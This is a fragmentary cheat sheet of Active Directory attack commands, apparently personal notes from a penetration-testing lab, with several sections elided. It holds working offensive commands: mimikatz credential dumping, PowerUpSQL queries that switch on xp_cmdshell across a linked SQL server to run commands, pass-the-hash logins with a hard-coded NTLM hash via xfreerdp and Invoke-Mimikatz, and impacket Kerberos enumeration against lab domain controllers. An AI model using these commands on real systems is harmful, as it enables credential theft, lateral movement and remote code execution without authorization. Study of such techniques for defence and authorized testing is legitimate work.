...
# Computer - Constrained Delegation (ex. TIME or LDAP)
...
# Computer - Constrained Delegation (ex. WWW or HTTP)
.\mimikatz.exe privilege::debug sekurlsa::msv exit
...
# RCE from PowerUpSQL
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'SELECT * FROM OPENQUERY("m3sqlw.m3c.local", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [m3sqlw.m3c.local]'
Get-SQLQuery -Instance "CYWEBDW\SQLEXPRESS,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [m3sqlw.m3c.local]'
Get-SQLServerLinkCrawl -Instance CYWEBDW\SQLEXPRESS -Query "exec master..xp_cmdshell 'whoami'"
...
# child -> parent domain (Trust Keys)
...
sudo  xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore

# Enable-PSSession
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell'"
...
nano ansible.hash 	# remove first line
...
impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator

sudo python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
